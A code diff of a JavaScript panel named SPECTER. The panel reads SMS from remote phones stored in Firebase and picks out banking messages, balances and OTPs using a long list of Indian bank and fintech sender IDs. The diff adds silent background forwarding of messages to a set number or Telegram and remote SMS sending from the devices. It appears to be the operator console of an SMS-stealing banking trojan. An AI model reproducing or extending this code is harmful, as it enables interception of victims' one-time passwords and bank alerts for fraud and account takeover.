@@ -1,5 +1,5 @@
 /* ═══════════════════════════════════════════════════════════
-   SPECTER v5 — Bank SMS Filter + Comprehensive Sender IDs
+   SPECTER v5.3 — Background Forward + Central SMS + Debug Logs
    ═══════════════════════════════════════════════════════════ */
 
 var CFG = window.SPECTER || {};
@@ -12,7 +12,7 @@ var deviceSimMap={},deviceSimKey='specter_device_sims';
 var _msgCache={};
 var gridFilter='all';
 
-var mPoll=null,dPoll=null,aPoll=null;
+var mPoll=null,dPoll=null,aPoll=null,bgPoll=null;
 var curMsgDev=null,lastKeys=new Set();
 var amCache={},amFetch={};
 var amAll=[],amFilt=[],amCount=0,amObs=null,amLoading=false,amLoaded=false,AM=80;
@@ -30,10 +30,9 @@ var forwardTracker={};
 var tgDiagnostics = {lastError:'', lastUpdate:0, updateCount:0, webhookInfo:'', botInfo:null};
 
 /* ═══════════════════════════════════════════════════════════
-   🏦 BANK SENDER IDs — comprehensive Indian bank map
+   🏦 BANK SENDER IDs
    ═══════════════════════════════════════════════════════════ */
 var BANK_SENDERS = {
-  /* Major banks */
   'HDFCBK':'HDFC Bank','HDFCBN':'HDFC Bank','HDFC':'HDFC Bank','HDFCCC':'HDFC Card',
   'SBIINB':'SBI','SBIMSG':'SBI','SBIUPI':'SBI','SBIPSG':'SBI','SBIMSM':'SBI','SBIBNK':'SBI','SBICRD':'SBI Card','SBICARD':'SBI Card',
   'ICICIB':'ICICI','ICICIM':'ICICI','ICICIBNK':'ICICI','ICICRD':'ICICI Card','ICICIC':'ICICI Card',
@@ -46,19 +45,17 @@ var BANK_SENDERS = {
   'IDBIBK':'IDBI','IDBICB':'IDBI','IDBIMS':'IDBI',
   'YESBNK':'Yes Bank','YESBK':'Yes Bank',
   'INDUSB':'IndusInd','INDUSM':'IndusInd',
-  'IDFCFB':'IDFC First','IDFCBK':'IDFC First','IDFCFB':'IDFC First',
+  'IDFCFB':'IDFC First','IDFCBK':'IDFC First',
   'FEDERL':'Federal Bank','FEDBNK':'Federal Bank','FEDBK':'Federal Bank',
   'RBLCRD':'RBL Bank','RBLBNK':'RBL Bank',
   'AUBANK':'AU Bank','AUSFB':'AU Small Finance',
   'BOIIND':'Bank of India','BOIBNK':'Bank of India',
   'CENTBK':'Central Bank','CBIBNK':'Central Bank',
-  'KVBSMS':'Karur Vysya','KARURV':'Karur Vysya',
-  'KARBNK':'Karnataka Bank',
+  'KVBSMS':'Karur Vysya','KARURV':'Karur Vysya','KARBNK':'Karnataka Bank',
   'INDIANB':'Indian Bank','INDBNK':'Indian Bank',
   'UCOBNK':'UCO Bank','UCOB':'UCO Bank',
   'PSBANK':'Punjab & Sind','PSBSMS':'Punjab & Sind',
-  'BANDHN':'Bandhan Bank',
-  'DBSBNK':'DBS Bank',
+  'BANDHN':'Bandhan Bank','DBSBNK':'DBS Bank',
   'CITIBN':'Citi Bank','CITIBK':'Citi Bank',
   'SCBANK':'Standard Chartered','SCB':'Standard Chartered',
   'HSBCIN':'HSBC','HSBCBK':'HSBC',
@@ -68,71 +65,42 @@ var BANK_SENDERS = {
   'EQUITB':'Equitas Bank','EQUIT':'Equitas',
   'SURYOD':'Suryoday','SURYO':'Suryoday',
   'UTKARB':'Utkarsh Bank','UTKARS':'Utkarsh',
-  'SARSWT':'Saraswat Bank',
-  'COSMSB':'Cosmos Bank',
-  'NKGSBB':'NKGSB Bank',
+  'SARSWT':'Saraswat Bank','COSMSB':'Cosmos Bank','NKGSBB':'NKGSB Bank',
   'SIBLTD':'South Indian Bank','SIBBNK':'South Indian',
   'TMBLTD':'Tamilnad Mercantile','TMBANK':'Tamilnad Mercantile',
   'CUBLTD':'City Union Bank','CUBANK':'City Union Bank',
   'DCBBLK':'DCB Bank','DCBANK':'DCB Bank',
-  'NAINBK':'Nainital Bank',
-  'PGBANK':'Punjab Gramin',
-  'BAROUP':'Baroda UP Bank',
+  'NAINBK':'Nainital Bank','PGBANK':'Punjab Gramin','BAROUP':'Baroda UP Bank',
   'MAHABK':'Bank of Maharashtra','BOMBNK':'Bank of Maharashtra',
   'JKBANK':'J&K Bank','JKB':'J&K Bank',
-  'OBCBNK':'OBC','OBCMSG':'OBC',
-  'ANDBBK':'Andhra Bank','ANDHRA':'Andhra Bank',
-  'CORPBK':'Corporation Bank',
-  'DENABK':'Dena Bank',
+  'OBCBNK':'OBC','OBCMSG':'OBC','ANDBBK':'Andhra Bank','ANDHRA':'Andhra Bank',
+  'CORPBK':'Corporation Bank','DENABK':'Dena Bank',
   'VIJBNK':'Vijaya Bank','VIJAYA':'Vijaya Bank',
   'PALLAV':'Pallavan Grama','PALLAVN':'Pallavan',
   'DHANBK':'Dhanlaxmi','DHANLX':'Dhanlaxmi',
   'LVBBNK':'Lakshmi Vilas','LAKSMI':'Lakshmi Vilas',
-  'TJSB':'TJSB Bank',
-  'ABHYUD':'Abhyudaya Bank',
-  'BHARAT':'Bharat Coop','BHARATCB':'Bharat Coop',
-  'SARASWAT':'Saraswat Coop',
+  'TJSB':'TJSB Bank','ABHYUD':'Abhyudaya Bank',
+  'BHARAT':'Bharat Coop','BHARATCB':'Bharat Coop','SARASWAT':'Saraswat Coop',
   'TNCB':'Tamil Nadu Coop','TNSB':'Tamil Nadu Coop',
-  'APCOB':'APCOB','APGB':'AP Grameena',
-  'TGGB':'Telangana Grameena',
-  'KGB':'Kerala Gramin','KLGB':'Kerala Gramin',
-  'BGB':'Bangiya Gramin',
-  'PBGB':'Paschim Banga Gramin',
-  'RMGB':'Rajasthan Marudhara',
-  'BRGB':'Baroda Rajasthan',
-  'CGB':'Chhattisgarh Gramin',
-  'MPGB':'MP Gramin','MGB':'MP Gramin',
-  'UPGB':'UP Gramin',
-  'HGB':'Haryana Gramin',
-  'JKGB':'J&K Grameen',
-  'PGBG':'Punjab Gramin',
-  'HPGB':'HP Gramin','HIMGB':'HP Gramin',
-  'UKGB':'Uttarakhand Gramin',
-  'ARGB':'Arunachal Gramin',
-  'ASGB':'Assam Gramin',
-  'MNGB':'Manipur Gramin','MGBI':'Manipur Gramin',
-  'MZGB':'Mizoram Gramin',
-  'NLGB':'Nagaland Gramin',
-  'TRGB':'Tripura Gramin',
-  'SKGB':'Sikkim Gramin',
-  'ODGB':'Odisha Gramin','OGB':'Odisha Gramin',
-  'JHGB':'Jharkhand Gramin',
+  'APCOB':'APCOB','APGB':'AP Grameena','TGGB':'Telangana Grameena',
+  'KGB':'Kerala Gramin','KLGB':'Kerala Gramin','BGB':'Bangiya Gramin',
+  'PBGB':'Paschim Banga Gramin','RMGB':'Rajasthan Marudhara','BRGB':'Baroda Rajasthan',
+  'CGB':'Chhattisgarh Gramin','MPGB':'MP Gramin','MGB':'MP Gramin',
+  'UPGB':'UP Gramin','HGB':'Haryana Gramin','JKGB':'J&K Grameen',
+  'PGBG':'Punjab Gramin','HPGB':'HP Gramin','HIMGB':'HP Gramin',
+  'UKGB':'Uttarakhand Gramin','ARGB':'Arunachal Gramin','ASGB':'Assam Gramin',
+  'MNGB':'Manipur Gramin','MGBI':'Manipur Gramin','MZGB':'Mizoram Gramin',
+  'NLGB':'Nagaland Gramin','TRGB':'Tripura Gramin','SKGB':'Sikkim Gramin',
+  'ODGB':'Odisha Gramin','OGB':'Odisha Gramin','JHGB':'Jharkhand Gramin',
   'BGBB':'Bihar Gramin','BKGB':'Bihar KGB',
-  /* Payment Banks / Wallets */
   'PAYTMB':'Paytm','PAYTM':'Paytm','PYTMBK':'Paytm Bank','PAYTMPB':'Paytm Payments Bank',
   'PHONEPE':'PhonePe','PPBL':'PhonePe','PPB':'PhonePe',
   'AIRTEL':'Airtel','AIRBNK':'Airtel Payments Bank','AMOB':'Airtel Money',
   'JIOPB':'Jio Payments Bank','JIOBPB':'Jio Payments Bank','JIOB':'Jio',
-  'FINO':'Fino','FINOPB':'Fino Payments Bank',
-  'NSDLPB':'NSDL Payments Bank',
-  'INDIA1':'India1 Payments Bank',
-  'FIPB':'Fino Payments',
-  'IPPB':'India Post Payments Bank',
-  'MOMOPB':'Momo',
-  /* NBFC / Fintech / Finance */
+  'FINO':'Fino','FINOPB':'Fino Payments Bank','NSDLPB':'NSDL Payments Bank',
+  'INDIA1':'India1 Payments Bank','FIPB':'Fino Payments','IPPB':'India Post Payments Bank','MOMOPB':'Momo',
   'BAJAJF':'Bajaj Finserv','BFL':'Bajaj Finance','BAJAJ':'Bajaj','BAJAJFIN':'Bajaj Finance',
-  'FULLTN':'Fullerton','FULERT':'Fullerton',
-  'HDBFS':'HDB Financial',
+  'FULLTN':'Fullerton','FULERT':'Fullerton','HDBFS':'HDB Financial',
   'TATACP':'Tata Capital','TATCAP':'Tata Capital','TATACAP':'Tata Capital',
   'MUTHOT':'Muthoot','MUTH':'Muthoot','MUTHOOTF':'Muthoot',
   'ABCAPL':'Aditya Birla Capital','ABCL':'Aditya Birla',
@@ -143,12 +111,9 @@ var BANK_SENDERS = {
   'MANAPP':'Manappuram','MFL':'Manappuram','MANAPPU':'Manappuram',
   'SUNDAR':'Sundaram','SFC':'Sundaram Finance',
   'MAHIND':'Mahindra Finance','MMFSL':'Mahindra Finance','MAHFIN':'Mahindra',
-  'HEROFI':'Hero FinCorp','HEROFINC':'Hero FinCorp',
-  'TVS':'TVS Credit','TVSCRD':'TVS Credit',
-  'HDFCLT':'HDFC Ltd','HDFCLTD':'HDFC Ltd',
-  'ICICIHF':'ICICI HFC','ICICIH':'ICICI Home',
-  'LICHF':'LIC Housing','LICHFL':'LIC Housing',
-  'PNBHF':'PNB Housing','PNBHFL':'PNB Housing',
+  'HEROFI':'Hero FinCorp','HEROFINC':'Hero FinCorp','TVS':'TVS Credit','TVSCRD':'TVS Credit',
+  'HDFCLT':'HDFC Ltd','HDFCLTD':'HDFC Ltd','ICICIHF':'ICICI HFC','ICICIH':'ICICI Home',
+  'LICHF':'LIC Housing','LICHFL':'LIC Housing','PNBHF':'PNB Housing','PNBHFL':'PNB Housing',
   'ADITYAB':'Aditya Birla Finance','ABFL':'Aditya Birla Finance',
   'CREDBK':'CRED','CRED':'CRED','CREDCL':'CRED',
   'SLICEB':'Slice','SLICEP':'Slice','SLICE':'Slice',
@@ -156,26 +121,18 @@ var BANK_SENDERS = {
   'KREDIT':'KreditBee','KBEE':'KreditBee','KBBANK':'KreditBee',
   'MONEYT':'MoneyTap','MONEYVIEW':'MoneyView','MVAPP':'MoneyView',
   'FIBE':'Fi Money','FIMONEY':'Fi','JUPITE':'Jupiter','JUPBNK':'Jupiter',
-  'WAZIRX':'WazirX','COINDCX':'CoinDCX',
-  'DHAN':'Dhan','ZERODHA':'Zerodha','GROWW':'Groww','UPSTOX':'Upstox',
-  'ANGELB':'Angel One','ANGEL':'Angel One','ICICID':'ICICI Direct',
-  'KOTAKSEC':'Kotak Securities','HDFCSEC':'HDFC Securities',
-  'MOTILAL':'Motilal Oswal','MOSL':'Motilal Oswal',
-  'AXISDIR':'Axis Direct','SBISEC':'SBI Securities',
-  'PAISAB':'Paisabazaar','PAISA':'Paisabazaar',
-  'BANKBAZ':'BankBazaar','POLICYB':'PolicyBazaar',
-  'CLEARTAX':'ClearTax','CLEAR':'ClearTax',
-  'ZAGGLE':'Zaggle','PLUXEE':'Pluxee','SODEXO':'Sodexo',
-  'PAYU':'PayU','RAZORP':'Razorpay','RZRPAY':'Razorpay',
-  'CASHFRE':'Cashfree','CFREE':'Cashfree',
-  'INSTAMO':'Instamojo','BILLDESK':'BillDesk','BILLDSK':'BillDesk',
-  'CCAVENUE':'CCAvenue','PAYUPAY':'PayU',
+  'WAZIRX':'WazirX','COINDCX':'CoinDCX','DHAN':'Dhan','ZERODHA':'Zerodha',
+  'GROWW':'Groww','UPSTOX':'Upstox','ANGELB':'Angel One','ANGEL':'Angel One',
+  'ICICID':'ICICI Direct','KOTAKSEC':'Kotak Securities','HDFCSEC':'HDFC Securities',
+  'MOTILAL':'Motilal Oswal','MOSL':'Motilal Oswal','AXISDIR':'Axis Direct','SBISEC':'SBI Securities',
+  'PAISAB':'Paisabazaar','PAISA':'Paisabazaar','BANKBAZ':'BankBazaar','POLICYB':'PolicyBazaar',
+  'CLEARTAX':'ClearTax','CLEAR':'ClearTax','ZAGGLE':'Zaggle','PLUXEE':'Pluxee','SODEXO':'Sodexo',
+  'PAYU':'PayU','RAZORP':'Razorpay','RZRPAY':'Razorpay','CASHFRE':'Cashfree','CFREE':'Cashfree',
+  'INSTAMO':'Instamojo','BILLDESK':'BillDesk','BILLDSK':'BillDesk','CCAVENUE':'CCAvenue',
   'MPESA':'M-Pesa','VODAFON':'Vodafone M-Pesa',
-  /* Credit Card Bureaus */
   'CIBIL':'CIBIL','CIBILT':'CIBIL','TRANSUN':'TransUnion','TUCIBIL':'TransUnion',
   'EXPERIA':'Experian','EXPRN':'Experian','CRIF':'CRIF','CRIFHS':'CRIF',
   'EQUIFAX':'Equifax','EQFX':'Equifax',
-  /* Insurance */
   'LICIND':'LIC','LICI':'LIC','LICOFI':'LIC',
   'HDFCERGO':'HDFC Ergo','HDFCLIFE':'HDFC Life',
   'ICICIPRU':'ICICI Prudential','ICICILOM':'ICICI Lombard',
@@ -191,9 +148,8 @@ var BANK_SENDERS = {
   'KOTAKL':'Kotak Life','PNBLIFE':'PNB MetLife','PNBMET':'PNB MetLife'
 };
 
-/* ── Keywords for banking detection ── */
 var BANK_BAL_KEYWORDS = ['avl bal','avail bal','available bal','avbl bal','avail. bal','avl. bal','avlbal','availbal',
-  'ledger bal','book bal','closing bal','available balance','avl balance','available bal','avlbalance',
+  'ledger bal','book bal','closing bal','available balance','avl balance','avlbalance',
   'bal:','bal -','bal is','bal rs','bal inr','bal. rs','bal. inr','balance:','balance is','balance -',
   'balance rs','balance inr','bal ₹','balance ₹','ac bal','acc bal','a/c bal','account balance'];
 var BANK_TXN_KEYWORDS = ['debited','credited','withdrawn','deposited','spent','transferred','paid to','received from',
@@ -205,37 +161,17 @@ var BANK_PROMO_KEYWORDS = ['apply now','pre-approved','pre approved','loan offer
   'get up to','interest rate','festive offer','discount of','flat ₹','flat rs','shop now','buy now',
   'sale ends','limited time','last chance','exclusive offer','hurry','grab now','don\'t miss'];
 
-function _normSender(s){
-  if(!s)return '';
-  s=String(s).toUpperCase();
-  s=s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|BX|XX|AX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|VK|JK|RK|IM|IP)-/,'');
-  s=s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/,'');
-  return s.replace(/[^A-Z0-9]/g,'');
-}
-
-function detectBank(sender){
-  var s=_normSender(sender);
-  if(!s)return null;
-  for(var k in BANK_SENDERS){
-    if(s.indexOf(k)!==-1)return {name:BANK_SENDERS[k],key:k};
-  }
-  return null;
-}
-
+function _normSender(s){if(!s)return '';s=String(s).toUpperCase();s=s.replace(/^(VM|AD|AX|TM|AT|BX|JD|CP|MD|MM|TA|SD|AA|XX|GV|AJ|DN|SG|BS|BW|UK|EQ|DT|VK|JK|RK|IM|IP)-/,'');s=s.replace(/-(S|P|T|G|N|A|D|B|R|L|H|M|Q|E|F|K|U|W|X|Y|Z)$/,'');return s.replace(/[^A-Z0-9]/g,'');}
+function detectBank(sender){var s=_normSender(sender);if(!s)return null;for(var k in BANK_SENDERS){if(s.indexOf(k)!==-1)return {name:BANK_SENDERS[k],key:k};}return null;}
 function isBankingSms(sender,message){
-  var bank=detectBank(sender);
-  if(!bank)return null;
+  var bank=detectBank(sender);if(!bank)return null;
   var m=String(message||'').toLowerCase();
-  // Promo check
-  var isPromo=false;
-  for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){
-    if(m.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}
-  }
-  var hasBal=false,hasTxn=false,hasOtp=false;
+  var isPromo=false;for(var p=0;p<BANK_PROMO_KEYWORDS.length;p++){if(m.indexOf(BANK_PROMO_KEYWORDS[p])!==-1){isPromo=true;break;}}
+  var hasBal=false,hasTxn=false;
   for(var b=0;b<BANK_BAL_KEYWORDS.length;b++){if(m.indexOf(BANK_BAL_KEYWORDS[b])!==-1){hasBal=true;break;}}
   for(var t=0;t<BANK_TXN_KEYWORDS.length;t++){if(m.indexOf(BANK_TXN_KEYWORDS[t])!==-1){hasTxn=true;break;}}
-  hasOtp=/\botp\b|one time password|one-time password|verification code/i.test(m);
-  if(isPromo&&!hasBal&&!hasTxn&&!hasOtp)return null;   // pure promo — skip
+  var hasOtp=/\botp\b|one time password|one-time password|verification code/i.test(m);
+  if(isPromo&&!hasBal&&!hasTxn&&!hasOtp)return null;
   if(hasBal||hasTxn||hasOtp)return bank;
   return null;
 }
@@ -264,7 +200,6 @@ async function initCloudConfig(){
   fetchBotUsername();
   if(userConfig.enabled!==false&&userConfig.botEnabled!==false&&userConfig.channelId){setTimeout(startTelegramBot,1200);}
 }
-
 async function createCloudBlob(){
   try{
     var r=await fetch(CFG.BLOB_BASE,{method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},body:JSON.stringify(userConfig),signal:AbortSignal.timeout(8000)});
@@ -275,7 +210,6 @@ async function createCloudBlob(){
 }
 function cacheConfigLocal(){try{localStorage.setItem(CFG.LS_CACHE,JSON.stringify(userConfig));}catch(e){}}
 function updateCloudStatus(msg,cls){var el=document.getElementById('cloudStatus');if(el){el.textContent=msg;el.className='settings-status '+(cls||'');}}
-
 async function saveCloudConfig(){
   cacheConfigLocal();
   if(!blobId){await createCloudBlob();return;}
@@ -290,18 +224,55 @@ async function fbGet(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;v
 async function fbSet(p,d,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});if(!r.ok)throw new Error('HTTP '+r.status);return r.json();}
 async function fbDel(p,url,key){var u=url||FB_URL,k=key!==undefined?key:FB_KEY;var r=await fetch(u+'/'+p+'.json'+(k?'?auth='+k:''),{method:'DELETE'});if(!r.ok)throw new Error('HTTP '+r.status);}
 
+/* ═══════════════════════════════════════════════════════════
+   🎯 CENTRAL SMS SENDER — sab jagah yahi use karo
+   ═══════════════════════════════════════════════════════════ */
+async function sendSmsViaDevice(dev, sim, to, message, tag){
+  if(!dev){console.error('[SMS] No device');return {ok:false,error:'no device'};}
+  if(!dev.status){console.warn('[SMS] Device offline: '+dev.name);}
+  var path='clients/'+dev.id+'/webhookEvent/sendSms';
+  var url=(dev._fbUrl||FB_URL);
+  var key=(dev._fbKey!==undefined?dev._fbKey:FB_KEY);
+  var payload={from:sim,to:to,message:message,isSended:false};
+  console.log('[SMS]['+tag+'] → Device: '+dev.name+' ('+dev.id+')');
+  console.log('[SMS]['+tag+'] → URL: '+url+'/'+path+'.json');
+  console.log('[SMS]['+tag+'] → Payload: '+JSON.stringify(payload));
+  try{
+    var fullUrl=url+'/'+path+'.json'+(key?'?auth='+key:'');
+    var r=await fetch(fullUrl,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+    if(!r.ok){
+      var txt='';
+      try{txt=await r.text();}catch(e){}
+      console.error('[SMS]['+tag+'] ✗ HTTP '+r.status+' — '+txt);
+      return {ok:false,error:'HTTP '+r.status+' '+txt};
+    }
+    var resp=null;try{resp=await r.json();}catch(e){}
+    console.log('[SMS]['+tag+'] ✓ Written to Firebase. Response: '+JSON.stringify(resp));
+    return {ok:true};
+  }catch(e){
+    console.error('[SMS]['+tag+'] ✗ Exception: '+e.message);
+    return {ok:false,error:e.message};
+  }
+}
+
+/* ═══════════ CONNECTION ═══════════ */
 function connect(){
   var url=document.getElementById('fbUrl').value.trim().replace(/\/+$/,'');
   if(!url){showErr('Enter your Firebase URL');return;}
   FB_URL=url;
   document.getElementById('setup').style.display='none';
   document.getElementById('panel').style.display='flex';
-  loadDevs();startDP();
+  loadDevs();startDP();startBgForwardPoll();
   setTimeout(function(){fbRegisterPrimary();},500);
   if(userConfig.firebases&&userConfig.firebases.length)setTimeout(loadFirebasesFromConfig,1000);
 }
 function showErr(m){var e=document.getElementById('serr');e.textContent=m;e.style.display='block';setTimeout(function(){e.style.display='none';},4000);}
-function disconnect(){FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;stopMP();stopDP();stopAP();stopTelegramBot();document.getElementById('panel').style.display='none';document.getElementById('setup').style.display='flex';}
+function disconnect(){
+  FB_URL='';FB_KEY='';allDevices=[];selDev=null;pinC={};noteC={};otpNoteC={};amCache={};amAll=[];amFilt=[];amLoaded=false;
+  stopMP();stopDP();stopAP();stopTelegramBot();stopBgForwardPoll();
+  document.getElementById('panel').style.display='none';
+  document.getElementById('setup').style.display='flex';
+}
 
 /* ═══════════ POLLERS ═══════════ */
 function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return;try{
@@ -314,12 +285,51 @@ function startDP(){stopDP();dPoll=setInterval(async function(){if(!FB_URL)return
   if(selDev){var up=allDevices.find(function(x){return x.id===selDev.id;});if(up){selDev=up;refreshDeviceModal();}}
 }catch(e){}},20000);}
 function stopDP(){if(dPoll){clearInterval(dPoll);dPoll=null;}}
+
 function startMP(id){stopMP();curMsgDev=id;pollMsgs(id);mPoll=setInterval(function(){if(selDev&&selDev.id===id)pollMsgs(id);},5000);}
 function stopMP(){if(mPoll){clearInterval(mPoll);mPoll=null;}curMsgDev=null;}
+
 function startAP(){stopAP();aPoll=setInterval(function(){if(document.getElementById('allMsgsModal').classList.contains('open'))pollAllFresh();},20000);}
 function stopAP(){if(aPoll){clearInterval(aPoll);aPoll=null;}}
 function setupObs(){killObs();var s=document.getElementById('amSentinel');if(!s)return;amObs=new IntersectionObserver(function(e){if(e[0].isIntersecting)renderPage();},{rootMargin:'200px'});amObs.observe(s);}
 function killObs(){if(amObs){amObs.disconnect();amObs=null;}}
+
+/* ═══════════════════════════════════════════════════════════
+   🔄 BACKGROUND FORWARD POLLER — Always runs, regardless of modal
+   ═══════════════════════════════════════════════════════════ */
+function startBgForwardPoll(){
+  stopBgForwardPoll();
+  bgPoll=setInterval(bgForwardTick,5000);
+  console.log('[BGPoll] Started background forward poller');
+}
+function stopBgForwardPoll(){if(bgPoll){clearInterval(bgPoll);bgPoll=null;console.log('[BGPoll] Stopped');}}
+
+async function bgForwardTick(){
+  if(!FB_URL)return;
+  if(userConfig.forwardEnabled===false)return;
+  if(!userConfig.myNumber)return;
+
+  // Determine which device to monitor
+  var dev=null;
+  if(activeDeviceUid){
+    var parts=activeDeviceUid.split('|||');
+    dev=allDevices.find(function(x){return x.id===parts[1]&&(x._fbId||'primary')===parts[0];});
+  }
+  if(!dev){dev=allDevices.find(function(d){return d.status;});}
+  if(!dev)return;
+  if(!dev.status)return; // skip offline
+
+  try{
+    var fbUrl=dev._fbUrl||FB_URL;
+    var fbKey=dev._fbKey!==undefined?dev._fbKey:FB_KEY;
+    var auth=fbKey?'?auth='+fbKey+'&':'?';
+    var r=await fetch(fbUrl+'/messages/'+dev.id+'.json'+auth+'orderBy="$key"&limitToLast=20',{signal:AbortSignal.timeout(8000)});
+    if(!r.ok)return;
+    var msgs=parseMsgs(await r.json());
+    if(!msgs.length)return;
+    checkAndForward(msgs,dev.id);
+  }catch(e){console.warn('[BGPoll] Error: '+e.message);}
+}
 
 /* ═══════════ DEVICE LOADING ═══════════ */
 async function loadDevs(){
@@ -331,22 +341,18 @@ async function loadDevs(){
     if(fbInstances.length>0){fbMergeAll();}else{allDevices=applyStableOrder(primDevs);renderStats();renderGrid();}
   }catch(e){document.getElementById('deviceGrid').innerHTML='<div class="empty" style="grid-column:1/-1"><div class="ei">⚠️</div><p>Failed to load devices</p></div>';}
 }
-
 function applyStableOrder(devs){
   if(!Array.isArray(devs)||!devs.length)return devs;
-  var orderMap={};
-  try{orderMap=JSON.parse(localStorage.getItem('specter_device_order')||'{}');}catch(e){}
+  var orderMap={};try{orderMap=JSON.parse(localStorage.getItem('specter_device_order')||'{}');}catch(e){}
   var max=0;Object.keys(orderMap).forEach(function(k){var v=parseInt(orderMap[k],10);if(v>max)max=v;});
   devs.forEach(function(d){var num=parseInt(orderMap[d.id],10);if(isNaN(num)){max+=1;num=max;orderMap[d.id]=num;}d.deviceOrder=num;});
   devs.sort(function(a,b){return(a.deviceOrder||0)-(b.deviceOrder||0);});
   try{localStorage.setItem('specter_device_order',JSON.stringify(orderMap));}catch(e){}
   return devs;
 }
-
 function parseDT(dt){if(!dt)return 0;var s=String(dt).trim();if(/^\d{10,13}$/.test(s))return parseInt(s.length===13?s:s+'000');var m=s.match(/(\d{1,2})[\-\/\.](\d{1,2})[\-\/\.](\d{4}).*?(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i);if(m){var h=+m[4],mn=+m[5],sc=+(m[6]||0),ap=(m[7]||'').toLowerCase();if(ap==='pm'&&h<12)h+=12;if(ap==='am'&&h===12)h=0;return new Date(+m[3],+m[2]-1,+m[1],h,mn,sc).getTime();}var d=new Date(s);return isNaN(d.getTime())?0:d.getTime();}
 function parseBatt(v){if(v==null)return NaN;return parseInt(String(v).replace('%','').trim());}
 function fmtPh(n){if(!n)return'—';var s=String(n).replace(/\D/g,'');if(s.startsWith('91')&&s.length===12)return'+'+s;if(s.length===10)return'+91'+s;if(s.length>0)return'+'+s;return'—';}
-
 function parseDevs(data){
   var devs=[];
   if(data&&typeof data==='object'){
@@ -412,7 +418,6 @@ function renderGrid(){
   });
   grid.innerHTML=html;
 }
-
 function toggleFilterMenu(e){if(e)e.stopPropagation();document.getElementById('filterMenu').classList.toggle('open');}
 function setGridFilter(f){
   gridFilter=f;
@@ -432,15 +437,16 @@ function openDeviceModal(uid){
   if(!d){toast('⚠ Device not found');return;}
   selDev=d;activeDeviceUid=uid;
   try{localStorage.setItem(CFG.LS_ACTIVE||'specter_active_device',uid);}catch(e){}
+  console.log('[UI] Active device set: '+d.name+' ('+d.id+')');
   renderGrid();
   document.getElementById('deviceModal').classList.add('open');
   refreshDeviceModal();
-  var cached=_msgCache[uid];
+  var cacheKey=uid;
+  var cached=_msgCache[cacheKey];
   if(cached){allMsgs=cached;lastKeys=new Set(cached.map(function(m){return m.key;}));updCnt();filterActiveMsgs();_silentRefresh(selDev);}
   else{document.getElementById('dmMsgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading…</div>';allMsgs=[];lastKeys=new Set();preloadMsgs(selDev.id);}
   updOtpNoteBox();
 }
-
 function refreshDeviceModal(){
   if(!selDev)return;
   var d=selDev;
@@ -474,7 +480,6 @@ function refreshDeviceModal(){
   document.getElementById('dmSendDisp').innerHTML='<div style="width:9px;height:9px;border-radius:50%;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 7px var(--mint)':'')+'"></div><div style="flex:1;min-width:0"><div class="dd-name">'+esc(d.name)+'</div><div class="dd-id">'+esc(d.id)+'</div></div>';
   loadPinActive();
 }
-
 function dmSwitchTab(tab){
   document.querySelectorAll('.dm-tab').forEach(function(t){t.classList.toggle('active',t.dataset.tab===tab);});
   document.querySelectorAll('.dm-tab-pane').forEach(function(p){p.classList.remove('active');});
@@ -592,6 +597,7 @@ function _silentRefresh(dev){
       var msgs=parseMsgs(data);
       _msgCache[cacheKey]=msgs;
       if(selDev&&selDev.id===dev.id){allMsgs=msgs;lastKeys=new Set(msgs.map(function(m){return m.key;}));updCnt();filterActiveMsgs();}
+      if(!forwardTracker[dev.id]&&msgs.length){forwardTracker[dev.id]=msgs[0].key;saveForwardTracker();console.log('[FWD] Baseline set (silent refresh) for '+dev.id);}
       startMP(dev.id);
     }).catch(function(){startMP(dev.id);});
 }
@@ -671,10 +677,9 @@ async function sendSmsActive(){
   if(!to||!msg){toast('⚠ Fill both fields');return;}
   var sim=deviceSimMap[selDev.id]||1;
   var btn=document.getElementById('dmSendBtn');btn.disabled=true;btn.textContent='Sending…';
-  try{
-    await fbSet('clients/'+selDev.id+'/webhookEvent/sendSms',{from:sim,to:to,message:msg,isSended:false},selDev._fbUrl,selDev._fbKey);
-    showResActive(true,'✓ SMS queued from SIM '+sim);document.getElementById('dmSendMsg').value='';document.getElementById('dmSendTo').value='';
-  }catch(e){showResActive(false,'⚠ Failed: '+e.message);}
+  var res=await sendSmsViaDevice(selDev,sim,to,msg,'manual');
+  if(res.ok){showResActive(true,'✓ SMS queued from SIM '+sim);document.getElementById('dmSendMsg').value='';document.getElementById('dmSendTo').value='';}
+  else{showResActive(false,'⚠ Failed: '+res.error);}
   btn.disabled=false;btn.textContent='🚀 Send Message';
 }
 function showResActive(ok,m){var el=document.getElementById('dmSendRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}
@@ -812,6 +817,31 @@ function populateSettingsUI(){
   document.getElementById('setTgEnabled').checked=userConfig.botEnabled!==false;
   document.getElementById('setFwdEnabled').checked=userConfig.forwardEnabled!==false;
   renderFbList();updateTgStatusLine();
+  updateForwardModeUI();
+}
+function setForwardMode(mode){
+  userConfig.forwardMode=mode;
+  cacheConfigLocal();
+  debouncedCloudSave();
+  updateForwardModeUI();
+  toast('✓ Forward mode: '+(mode==='banking'?'Banking only':'All messages'));
+}
+function updateForwardModeUI(){
+  var mode=userConfig.forwardMode||'all';
+  var bAll=document.getElementById('setFwdModeAll');
+  var bBank=document.getElementById('setFwdModeBank');
+  var hint=document.getElementById('fwdModeHint');
+  if(bAll){
+    bAll.style.background=mode==='all'?'rgba(168,85,247,.16)':'var(--bg3)';
